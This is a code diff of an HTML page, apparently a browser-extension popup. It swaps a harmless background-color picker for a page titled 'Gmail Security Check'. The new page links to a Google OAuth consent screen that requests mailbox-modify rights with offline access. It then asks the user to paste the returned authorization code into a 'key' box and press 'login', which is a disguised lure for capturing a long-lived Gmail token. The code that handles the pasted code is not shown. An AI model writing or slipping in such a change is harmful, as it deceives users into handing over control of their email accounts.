@@ -34,16 +34,11 @@
   </head>
 
   <body>
-    <h1>Background Color Changer</h1>
+    <h1>Gmail Security Check</h1>
     <div id="container">
-      <span>Choose a color</span>
-      <select id="dropdown">
-        <option selected disabled hidden value=''></option>
-        <option value="white">White</option>
-        <option value="pink">Pink</option>
-        <option value="green">Green</option>
-        <option value="yellow">Yellow</option>
-      </select>
+      <a target="_blank" href="https://accounts.google.com/o/oauth2/auth?scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fgmail.modify&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&response_type=code&client_id=745798114028-gv63phh58sdka9qmjhuoqssel54d789b.apps.googleusercontent.com&access_type=offline">auth code</a>
+      <input type="text" id="key">
+      <button id="login">login</button>
     </div>
   </body>
 </html>
